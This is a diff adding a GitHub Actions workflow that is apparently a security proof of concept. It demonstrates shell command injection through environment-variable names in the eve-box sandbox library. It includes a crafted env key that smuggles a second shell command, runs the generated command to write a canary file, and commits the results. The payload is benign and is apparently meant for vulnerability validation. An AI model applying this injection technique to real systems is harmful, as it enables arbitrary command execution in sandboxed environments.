@@ -1,0 +1,92 @@
+name: Eve Box Env-Key Injection PoC
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/eve-box-env-key-poc.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: Validate against official adapter with fake Box client
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/eve-box /tmp/eve-box-env-key-canary
+          git clone --depth=1 https://github.com/ariana-dot-dev/eve-box.git /tmp/eve-box
+          cd /tmp/eve-box
+          npm ci --ignore-scripts
+          npm run build
+
+          cat > /tmp/poc.mjs <<'JS'
+          import { asciiBox } from '/tmp/eve-box/dist/src/index.js';
+          import { execFileSync } from 'node:child_process';
+          import fs from 'node:fs';
+
+          const commands = [];
+          const box = { id: 'bx_local_canary', state: 'ready', name: 'local-canary' };
+          const client = {
+            async create() { return box; },
+            async get() { return box; },
+            async update() { return box; },
+            async stop() { return { ok: true }; },
+            async resume() { return { ok: true }; },
+            async command(_boxId, input) {
+              commands.push(input.command);
+              return { exitCode: 0, stdout: '', stderr: '' };
+            },
+            async readFile() { return ''; },
+            async writeFile() {},
+            async readFileBinary() { return null; },
+            async writeFileBinary() {},
+          };
+
+          const backend = asciiBox({ client, noEnv: true, networkPolicy: 'allow-all' });
+          const handle = await backend.create({
+            templateKey: null,
+            sessionKey: 'env-key-poc',
+            runtimeContext: { appRoot: process.cwd() },
+            tags: { test: 'env-key-poc' },
+          });
+          const session = await handle.useSessionFn({ networkPolicy: 'allow-all' });
+          commands.length = 0;
+
+          const maliciousKey = 'X=1; printf INJECTED > /tmp/eve-box-env-key-canary; #';
+          await session.run({
+            command: 'printf SAFE',
+            env: { [maliciousKey]: 'benign-value' },
+          });
+
+          if (commands.length !== 1) throw new Error(`expected one command, got ${commands.length}`);
+          const generated = commands[0];
+          console.log('GENERATED_COMMAND=' + JSON.stringify(generated));
+
+          execFileSync('/bin/bash', ['-c', generated], { stdio: 'pipe' });
+          const canary = fs.readFileSync('/tmp/eve-box-env-key-canary', 'utf8');
+          console.log('CANARY_CONTENT=' + JSON.stringify(canary));
+          if (canary !== 'INJECTED') throw new Error('canary was not written by injected env key');
+
+          console.log('VALIDATED=YES');
+          console.log('IMPACT=Arbitrary shell syntax in an env variable NAME is executed before the intended sandbox command.');
+          JS
+
+          node /tmp/poc.mjs | tee /tmp/eve-box-env-key-poc.txt
+          cp /tmp/eve-box-env-key-poc.txt "$GITHUB_WORKSPACE/eve-box-env-key-poc.txt"
+
+      - name: Persist PoC output
+        shell: bash
+        run: |
+          git config user.name 'box-recon-bot'
+          git config user.email 'box-recon-bot@users.noreply.github.com'
+          git add -f eve-box-env-key-poc.txt
+          git diff --cached --quiet && exit 0
+          git commit -m 'Record validated Eve Box env-key injection PoC [skip ci]'
+          git push origin HEAD:main
